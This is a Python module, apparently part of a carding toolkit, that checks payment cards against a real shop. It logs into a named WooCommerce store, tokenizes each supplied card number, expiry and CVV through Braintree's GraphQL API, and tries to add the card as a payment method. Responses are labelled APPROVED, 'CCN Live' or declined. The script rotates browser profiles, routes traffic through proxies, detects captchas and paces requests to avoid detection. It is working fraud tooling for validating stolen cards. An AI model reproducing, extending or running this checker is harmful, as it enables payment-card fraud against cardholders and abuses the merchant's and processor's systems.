"""
Braintree Laguna Gate - Add payment method flow
Enhanced with rate limiting and stealth headers.
"""
import base64
import httpx
import json
import re
import os
from faker import Faker
from tools.rate_limiter import wait_for_rate_limit, report_rate_limit_hit, report_request_success
from tools.user_agent_pool import generate_profile
from tools.captcha_detector import detect_captcha

fake = Faker()

LAGUNA_USER = os.environ.get('LAGUNA_USER', '')
LAGUNA_PASS = os.environ.get('LAGUNA_PASS', '')
LAGUNA_DOMAIN = "parts.lagunatools.com"

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

def extract_braintree_token(response_text):
    pattern = r'wc_braintree_client_token\s*=\s*\["([^"]+)"\]'
    match = re.search(pattern, response_text)
    if not match:
        return None
    token_base64 = match.group(1)
    try:
        decoded_json = base64.b64decode(token_base64).decode('utf-8')
        data = json.loads(decoded_json)
        return data
    except Exception:
        return None

async def braintree_laguna_check_async(cc, mes, ano, cvv, proxy=None):
    try:
        if not LAGUNA_USER or not LAGUNA_PASS:
            return "Error: LAGUNA_USER and LAGUNA_PASS env vars required", True
        
        fullz = f"{cc}|{mes}|{ano}|{cvv}"
        
        proxies = None
        if proxy:
            if isinstance(proxy, dict):
                proxy_url = proxy.get('http') or proxy.get('https')
            else:
                proxy_url = proxy
            if proxy_url:
                proxies = proxy_url
        
        profile = generate_profile(session_id="braintree_laguna")
        
        async with httpx.AsyncClient(timeout=40, proxy=proxies) as session:
            headers = profile.get_page_headers()
            
            wait_for_rate_limit("braintreegateway.com")
            response = await session.get('https://parts.lagunatools.com/login/', headers=headers)
            if response.status_code == 429:
                report_rate_limit_hit("braintreegateway.com", 429)
                return "Error: Rate limited (429)", True
            if response.status_code == 503:
                report_rate_limit_hit("braintreegateway.com", 503)
                return "Error: Service unavailable (503)", True
            captcha_result = detect_captcha(response.text)
            if captcha_result.detected and not captcha_result.should_retry:
                return f"Error: Captcha detected ({captcha_result.captcha_type})", True
            
            login_nonce = gets(response.text, 'id="user-registration-login-nonce" name="user-registration-login-nonce" value="', '"')
            if not login_nonce:
                return "Error: Failed to get login nonce", True
            
            headers['content-type'] = 'application/x-www-form-urlencoded'
            headers['origin'] = 'https://parts.lagunatools.com'
            headers['referer'] = 'https://parts.lagunatools.com/login/'
            
            data = {
                'username': LAGUNA_USER,
                'password': LAGUNA_PASS,
                'user-registration-login-nonce': login_nonce,
                '_wp_http_referer': '/login/',
                'login': 'Login',
                'redirect': '',
            }
            await session.post('https://parts.lagunatools.com/login/', headers=headers, data=data)
            await session.get('https://parts.lagunatools.com/customer-account/payment-methods/', headers=headers)
            
            headers['referer'] = 'https://parts.lagunatools.com/customer-account/payment-methods/'
            response = await session.get('https://parts.lagunatools.com/customer-account/add-payment-method/', headers=headers)
            
            nonce = gets(response.text, 'id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="', '"')
            token_data = extract_braintree_token(response.text)
            if not token_data:
                return "Error: Failed to extract Braintree token", True
            
            authorization_fingerprint = token_data.get('authorizationFingerprint')
            
            headers_bt = {
                'accept': '*/*',
                'authorization': f'Bearer {authorization_fingerprint}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'referer': 'https://assets.braintreegateway.com/',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            }
            
            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': 'a5deb879-1007-406e-8830-769fff810eae',
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc,
                            'expirationMonth': mes,
                            'expirationYear': ano,
                            'cvv': cvv,
                            'billingAddress': {
                                'postalCode': '10038-2609',
                                'streetAddress': '156 William St',
                            },
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }
            
            response = await session.post('https://payments.braintree-api.com/graphql', headers=headers_bt, json=json_data)
            token = gets(response.text, '"token":"', '"')
            
            if not token:
                resp_json = response.json()
                if 'errors' in resp_json:
                    err_msg = resp_json['errors'][0].get('message', 'Unknown error')
                    return f"DECLINED: {err_msg}", True
                return "Error: Failed to tokenize card", True
            
            headers_submit = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://parts.lagunatools.com',
                'referer': 'https://parts.lagunatools.com/customer-account/add-payment-method/',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            }
            
            data_submit = {
                'payment_method': 'braintree_cc',
                'braintree_cc_nonce_key': token,
                'braintree_cc_device_data': '{"correlation_id":"a5deb879-1007-406e-8830-769fff81"}',
                'braintree_cc_3ds_nonce_key': '',
                'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/crtwxgkstbhhh694/client_api","assetsUrl":"https://assets.braintreegateway.com","merchantId":"crtwxgkstbhhh694","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]}}',
                'woocommerce-add-payment-method-nonce': nonce,
                '_wp_http_referer': '/customer-account/add-payment-method/',
                'woocommerce_add_payment_method': '1',
            }
            
            response = await session.post(
                'https://parts.lagunatools.com/customer-account/add-payment-method/',
                headers=headers_submit,
                data=data_submit,
                follow_redirects=False
            )
            
            last4 = cc[-4:]
            site = "braintree"
            
            if response.status_code in (301, 302, 303, 307, 308):
                redirect_location = response.headers.get("location", "")
                if "payment-methods" in redirect_location:
                    report_request_success("braintreegateway.com")
                    return f"APPROVED ✅|{site}|Payment Method Added|{last4}", True
                return f"DECLINED ❌|{site}|Redirect: {redirect_location[:30]}|{last4}", True
            
            text = response.text
            if "Payment method successfully added" in text:
                report_request_success("braintreegateway.com")
                return f"APPROVED ✅|{site}|Payment Method Added|{last4}", True
            elif "Thank you" in text or '"result":"success"' in text:
                report_request_success("braintreegateway.com")
                return f"APPROVED ✅|{site}|Success|{last4}", True
            elif "CVV" in text.upper() or "CVC" in text.upper() or "security code" in text.lower():
                return f"CVV ❌|{site}|CVV Mismatch - CCN Live|{last4}", True
            elif "card number" in text.lower() or "invalid card" in text.lower():
                return f"DECLINED ❌|{site}|Invalid Card Number|{last4}", True
            elif "expired" in text.lower():
                return f"DECLINED ❌|{site}|Card Expired|{last4}", True
            elif "insufficient" in text.lower():
                return f"CCN ✅|{site}|Insufficient Funds - CVV Match|{last4}", True
            elif "declined" in text.lower():
                reason = gets(text, "Reason: ", "<") or gets(text, "Reason: ", ".") or "Generic decline"
                return f"DECLINED ❌|{site}|{reason[:30]}|{last4}", True
            else:
                if len(text) > 200:
                    return f"UNKNOWN ⚠️|{site}|Response Unrecognized|{last4}", True
                return f"DECLINED ❌|{site}|{text[:30]}|{last4}", True
                
    except httpx.TimeoutException:
        last4 = cc[-4:] if len(cc) >= 4 else "????"
        return f"DECLINED ❌|braintree|Request Timeout|{last4}", False
    except Exception as e:
        last4 = cc[-4:] if len(cc) >= 4 else "????"
        return f"DECLINED ❌|braintree|{str(e)[:30]}|{last4}", True

def gateway_check(cc, mes, ano, cvv, proxy=None):
    import asyncio
    loop = None
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result, proxy_ok = loop.run_until_complete(braintree_laguna_check_async(cc, mes, ano, cvv, proxy))
        return result, proxy_ok
    except Exception as e:
        last4 = cc[-4:] if len(cc) >= 4 else "????"
        return f"DECLINED ❌|braintree|{str(e)[:30]}|{last4}", True
    finally:
        if loop is not None:
            try:
                loop.close()
            except:
                pass
